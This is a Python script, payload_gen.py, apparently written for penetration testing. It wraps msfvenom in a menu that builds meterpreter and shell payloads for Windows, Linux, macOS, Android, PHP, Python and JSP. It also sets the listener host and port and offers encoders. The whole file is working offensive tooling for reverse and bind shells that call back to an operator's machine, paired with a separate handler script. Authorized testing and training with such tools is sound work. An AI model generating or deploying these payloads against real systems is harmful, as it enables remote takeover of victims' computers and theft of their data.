#!/usr/bin/env python3
"""
payload_gen.py — Interactive msfvenom payload generator (menu-driven).

Walks you through each choice (OS -> payload -> LHOST -> LPORT -> format ->
output file), building and running the msfvenom command for you. Menu-based so
you can't pick invalid combinations; LHOST/LPORT/filename are free input with
validation.

Usage:
    python3 payload_gen.py

Legal note: generate payloads only for systems you own or are authorized to
test. A payload is a tool; using it against a system without permission is
illegal.
"""

import os
import re
import sys
import json
import shutil
import ipaddress
import subprocess

# Where we save the payload settings so handler.py can pick them up.
SETTINGS_FILE = ".last_payload.json"

# Generated payloads go here (gitignored — they're products, not source).
PAYLOAD_DIR = "payloads"


# ---------------------------------------------------------------------------
# Hardcoded catalog: the common, reliable combinations.
# Structure: OS -> { payloads: {...}, formats: [...] }
#   payloads: menu label -> msfvenom payload string
#   formats:  valid output formats for that OS (first = default)
# These cover the ~95% case. For anything exotic, use msfvenom directly.
# ---------------------------------------------------------------------------
CATALOG = {
    "windows": {
        "payloads": {
            "meterpreter reverse_tcp": "windows/x64/meterpreter/reverse_tcp",
            "meterpreter reverse_https": "windows/x64/meterpreter/reverse_https",
            "meterpreter (x86) reverse_tcp": "windows/meterpreter/reverse_tcp",
            "shell reverse_tcp": "windows/x64/shell/reverse_tcp",
            "shell bind_tcp": "windows/x64/shell/bind_tcp",
        },
        "formats": ["exe", "dll", "psh", "raw"],
    },
    "linux": {
        "payloads": {
            "meterpreter reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
            "meterpreter (x86) reverse_tcp": "linux/x86/meterpreter/reverse_tcp",
            "shell reverse_tcp": "linux/x64/shell/reverse_tcp",
            "shell bind_tcp": "linux/x64/shell/bind_tcp",
        },
        "formats": ["elf", "raw"],
    },
    "macos": {
        "payloads": {
            "meterpreter reverse_tcp": "osx/x64/meterpreter/reverse_tcp",
            "shell reverse_tcp": "osx/x64/shell_reverse_tcp",
        },
        "formats": ["macho", "raw"],
    },
    "android": {
        "payloads": {
            "meterpreter reverse_tcp": "android/meterpreter/reverse_tcp",
            "meterpreter reverse_https": "android/meterpreter/reverse_https",
        },
        "formats": ["apk"],
    },
    "php": {
        "payloads": {
            "meterpreter reverse_tcp": "php/meterpreter/reverse_tcp",
            "reverse_php": "php/reverse_php",
        },
        "formats": ["raw"],   # php payloads are emitted as raw .php
    },
    "python": {
        "payloads": {
            "meterpreter reverse_tcp": "python/meterpreter/reverse_tcp",
            "shell reverse_tcp": "python/shell_reverse_tcp",
        },
        "formats": ["raw"],
    },
    "web / jsp": {
        "payloads": {
            "jsp meterpreter reverse_tcp": "java/jsp_shell_reverse_tcp",
        },
        "formats": ["raw", "war"],
    },
}

# Default file extension to suggest per format
EXT = {
    "exe": "exe", "dll": "dll", "psh": "ps1", "elf": "elf", "macho": "macho",
    "apk": "apk", "war": "war", "raw": "bin",
}

# Common encoders. menu label -> msfvenom encoder string (None = don't encode).
# NOTE: encoders help avoid bad characters; they do NOT reliably evade modern
# antivirus (shikata_ga_nai in particular is heavily signatured).
ENCODERS = {
    "none (recommended)": None,
    "x86/shikata_ga_nai": "x86/shikata_ga_nai",
    "x86/call4_dword_xor": "x86/call4_dword_xor",
    "x64/xor": "x64/xor",
    "cmd/powershell_base64": "cmd/powershell_base64",
}


# ---------------------------------------------------------------------------
# Small input helpers
# ---------------------------------------------------------------------------
def choose(title, options):
    """Shows a numbered menu, returns the chosen item from `options` (a list)."""
    print(f"\n{title}")
    for i, opt in enumerate(options, 1):
        print(f"  {i}) {opt}")
    while True:
        raw = input("Choose [number]: ").strip()
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return options[int(raw) - 1]
        print(f"  [!] Enter a number between 1 and {len(options)}.")


def ask_ip(prompt, default=None):
    """Asks for an IP, validates it. Empty input uses default if given."""
    hint = f" [{default}]" if default else ""
    while True:
        raw = input(f"{prompt}{hint}: ").strip()
        if not raw and default:
            return default
        try:
            ipaddress.ip_address(raw)
            return raw
        except ValueError:
            print("  [!] Not a valid IP address.")


def ask_port(prompt, default=4444):
    """Asks for a port 1-65535. Empty input uses default."""
    while True:
        raw = input(f"{prompt} [{default}]: ").strip()
        if not raw:
            return default
        if raw.isdigit() and 1 <= int(raw) <= 65535:
            return int(raw)
        print("  [!] Enter a port between 1 and 65535.")


def ask_filename(default):
    """Asks for an output filename. Empty input uses default."""
    while True:
        raw = input(f"Output file [{default}]: ").strip()
        name = raw if raw else default
        # Basic safety: no path traversal, no weird chars
        if re.match(r"^[\w.\-/]+$", name):
            return name
        print("  [!] Use letters, numbers, dot, dash, underscore, slash only.")


def ask_iterations(default=1):
    """Asks how many encoder passes. Empty input uses default."""
    while True:
        raw = input(f"Encoder iterations [{default}]: ").strip()
        if not raw:
            return default
        if raw.isdigit() and 1 <= int(raw) <= 50:
            return int(raw)
        print("  [!] Enter a number between 1 and 50.")


def ask_badchars():
    """Asks for bad characters to avoid (optional). Empty = none."""
    raw = input("Bad chars to avoid, e.g. \\x00\\x0a (Enter to skip): ").strip()
    return raw or None


def guess_local_ip():
    """Best-effort guess of this machine's LAN IP, to suggest as LHOST."""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))   # no packet sent; just picks the route
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Main flow
# ---------------------------------------------------------------------------
def main():
    if not shutil.which("msfvenom"):
        sys.exit("[!] msfvenom not found in PATH. Is Metasploit installed?")

    print("=" * 52)
    print("  msfvenom payload generator (interactive)")
    print("=" * 52)

    # 1. OS
    os_choice = choose("[1] Target platform:", list(CATALOG.keys()))
    entry = CATALOG[os_choice]

    # 2. Payload (filtered by OS)
    payload_labels = list(entry["payloads"].keys())
    payload_label = choose("[2] Payload:", payload_labels)
    payload = entry["payloads"][payload_label]

    # 3. LHOST (suggest the local IP)
    local = guess_local_ip()
    lhost = ask_ip("[3] LHOST (your listener IP)", default=local)

    # 4. LPORT
    lport = ask_port("[4] LPORT", default=4444)

    # 5. Format (filtered by OS)
    fmt = choose("[5] Output format:", entry["formats"])

    # 6. Encoder (optional — helps with bad chars, NOT reliable AV evasion)
    encoder_label = choose("[6] Encoder (optional):", list(ENCODERS.keys()))
    encoder = ENCODERS[encoder_label]
    iterations = ask_iterations() if encoder else 1
    badchars = ask_badchars() if encoder else None

    # 7. Output file (saved under payloads/)
    os.makedirs(PAYLOAD_DIR, exist_ok=True)
    default_name = f"payload_{os_choice.split()[0]}.{EXT.get(fmt, 'bin')}"
    name = ask_filename(default_name)
    # Keep everything inside payloads/ unless the user gave their own path
    outfile = name if os.path.sep in name else os.path.join(PAYLOAD_DIR, name)

    # --- Build the command ---
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", fmt,
    ]
    if encoder:
        cmd += ["-e", encoder, "-i", str(iterations)]
    if badchars:
        cmd += ["-b", badchars]
    cmd += ["-o", outfile]

    # --- Confirm before running ---
    print("\n" + "-" * 52)
    print("About to run:")
    print("  " + " ".join(cmd))
    print("-" * 52)
    if input("Proceed? [y/N]: ").strip().lower() != "y":
        sys.exit("Cancelled. Nothing was generated.")

    # --- Run msfvenom ---
    print("\n[*] Generating payload ...")
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        sys.exit(f"[!] msfvenom failed (exit {e.returncode}).")

    print(f"\n[+] Payload written to: {outfile}")

    # --- Save settings so handler.py can start a matching listener ---
    with open(SETTINGS_FILE, "w") as f:
        json.dump({
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "outfile": outfile,
        }, f, indent=2)

    # --- Remind how to catch it (handler) ---
    print("\n[*] To catch the connection, start the matching handler:")
    print("      python3 handler.py          # reads these settings automatically")
    print(f"\n    (payload {payload}  LHOST {lhost}  LPORT {lport})")


if __name__ == "__main__":
    main()